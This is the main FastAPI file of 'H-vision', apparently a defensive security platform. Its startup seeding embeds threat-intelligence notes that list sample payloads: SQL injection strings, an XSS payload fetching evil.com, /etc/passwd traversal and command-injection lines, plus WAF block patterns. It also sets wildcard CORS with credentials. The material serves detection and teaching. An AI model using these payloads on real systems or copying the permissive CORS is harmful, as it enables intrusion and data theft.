from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from app.core.config import settings
import logging

from app.routes import auth, chat, reports, red_team, events, patches
from app.database.connection import engine
from app.database.models import Base
from app.rag.chroma import chroma_service

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(
    title="H-vision API",
    version="1.0.0",
    description="H-vision Autonomous Defensive Security Platform API"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include Routers
app.include_router(auth.router, prefix="/api/v1")
app.include_router(chat.router, prefix="/api/v1")
app.include_router(reports.router, prefix="/api/v1")
app.include_router(red_team.router, prefix="/api/v1")
app.include_router(events.router, prefix="/api/v1")
app.include_router(patches.router, prefix="/api/v1")

from app.routes import proxy
# Note: No prefix here, the proxy handles its own /proxy/... namespace, or we can just mount it
app.include_router(proxy.router)

from app.routes import honeypot, compliance
app.include_router(honeypot.router)
app.include_router(compliance.router, prefix="/api/v1")

from app.routes import soar, discovery, timeline
app.include_router(soar.router, prefix="/api/v1")
app.include_router(discovery.router, prefix="/api/v1")
app.include_router(timeline.router, prefix="/api/v1")

from app.routes import darkweb, hunt, metrics, lifecycle, scheduler, hardening
app.include_router(darkweb.router, prefix="/api/v1")
app.include_router(hunt.router, prefix="/api/v1")
app.include_router(metrics.router, prefix="/api/v1")
app.include_router(lifecycle.router, prefix="/api/v1")
app.include_router(scheduler.router, prefix="/api/v1")
app.include_router(hardening.router, prefix="/api/v1")

@app.get("/health")
@app.get("/api/v1/health")
async def health_check():
    return {"status": "ok", "service": "hvision_api"}

@app.on_event("startup")
async def startup_event():
    logger.info("H-vision API starting up...")

    # ── 1. Auto-create all database tables ────────────────────────────────
    try:
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        logger.info("Database tables verified/created successfully.")
    except Exception as e:
        logger.error(f"Database setup error: {e}")

    # ── 2. Seed ChromaDB with threat intelligence knowledge ────────────────
    try:
        _seed_threat_intelligence()
        logger.info("ChromaDB threat intelligence seeded successfully.")
    except Exception as e:
        logger.warning(f"ChromaDB seeding failed (non-critical): {e}")

def _seed_threat_intelligence():
    """Seed ChromaDB with foundational security knowledge so the AI has context."""
    if not chroma_service.client:
        return

    threat_docs = [
        "SQL Injection (CWE-89, MITRE T1190): Attackers inject malicious SQL into query parameters. "
        "Payloads like ' OR 1=1--, UNION SELECT, or DROP TABLE bypass authentication and exfiltrate data. "
        "Mitigation: Use parameterized queries and prepared statements. Never concatenate user input into SQL.",

        "Cross-Site Scripting XSS (CWE-79, MITRE T1189): Attackers inject JavaScript payloads into web pages. "
        "Stored XSS persists in database; Reflected XSS executes via URL parameters. "
        "Common payloads: <script>alert(1)</script>, <img src=x onerror=fetch(evil.com)>. "
        "Mitigation: Output encoding, Content Security Policy headers, input sanitization.",

        "Path Traversal (CWE-22, MITRE T1083): Attackers use ../ sequences to read files outside the web root. "
        "Examples: /../../etc/passwd, /../../../../windows/win.ini. "
        "Mitigation: Validate and normalize file paths, use allowlists for accessible directories.",

        "Authentication Brute Force (CWE-307, MITRE T1110): Automated credential stuffing or dictionary attacks "
        "target login endpoints. Indicators: high-frequency requests from single IP, multiple failed logins. "
        "Mitigation: Account lockout, rate limiting, CAPTCHA, multi-factor authentication.",

        "Command Injection (CWE-78, MITRE T1059): Attackers inject OS commands via unsanitized inputs. "
        "Payloads: ; ls -la, && cat /etc/passwd, | whoami. "
        "Mitigation: Avoid shell execution with user input; use subprocess with argument lists.",

        "OWASP Top 10 2021 - A01 Broken Access Control: The most prevalent web security risk. "
        "Attackers bypass access controls to access unauthorized data or functionality. "
        "Includes IDOR, privilege escalation, directory traversal, and CORS misconfigurations.",

        "OWASP Top 10 2021 - A03 Injection: SQL, NoSQL, OS, LDAP injection attacks. "
        "Occurs when untrusted data is sent to an interpreter as part of a command or query. "
        "Detection: Look for special characters in input: ', --, ;, <, >, (, ), \\",

        "H-vision Blue Team Detections: This platform monitors for SQL injection, XSS, path traversal, "
        "authentication brute force, and anomalous API usage patterns. "
        "The SOC pipeline includes: Triage Agent, Threat Hunter Agent, Responder Agent, Communicator Agent. "
        "Automated responses include WAF rule generation and code patch proposals.",

        "WAF Rules for SQL Injection: Block patterns matching (' OR), (UNION SELECT), (DROP TABLE), "
        "(INSERT INTO), (DELETE FROM), (xp_cmdshell), (EXEC(). "
        "Apply rate limiting on endpoints with database interactions.",

        "Incident Response Playbook: 1) Identify and triage alert. 2) Contain the threat by blocking IPs. "
        "3) Eradicate by applying patches. 4) Recover by restoring clean state. "
        "5) Post-incident review and lessons learned documentation.",
    ]

    doc_ids = [f"threat_intel_{i}" for i in range(len(threat_docs))]
    metadatas = [{"source": "h-vision-seed", "category": "threat_intelligence"} for _ in threat_docs]

    try:
        chroma_service.add_documents(
            collection_name="threat_intelligence",
            documents=threat_docs,
            metadatas=metadatas,
            ids=doc_ids
        )
    except Exception as e:
        logger.warning(f"Threat intel seeding: {e}")

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("H-vision API shutting down.")
